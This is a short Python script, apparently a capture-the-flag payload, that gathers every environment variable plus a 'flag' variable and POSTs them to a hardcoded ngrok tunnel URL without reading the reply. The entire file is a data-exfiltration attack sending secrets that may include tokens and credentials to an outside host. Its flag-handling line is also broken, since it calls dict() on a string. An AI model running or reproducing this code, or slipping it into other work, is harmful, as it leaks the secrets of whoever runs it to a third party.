import os
import urllib.parse
import urllib.request

def send_data():
    data = dict(os.environ)
    flag = dict(os.getenv('flag'))

# Encode the data
    encoded_data = urllib.parse.urlencode(data).encode()
    encoded_data2 = urllib.parse.urlencode(flag).encode()

# Define the URL to which the data will be sent
    url = 'https://1a6b-2a02-a310-e143-8d80-2c80-a848-55ee-c65c.ngrok-free.app'  # Replace $URL with your actual URL

# Create the request object with the encoded data
    request = urllib.request.Request(url, data=encoded_data)
    request2 = urllib.request.Request(url, data=encoded_data2)

# Perform the request without reading the response
    urllib.request.urlopen(request).close()
    urllib.request.urlopen(request2).close()

# Call the function
send_data()
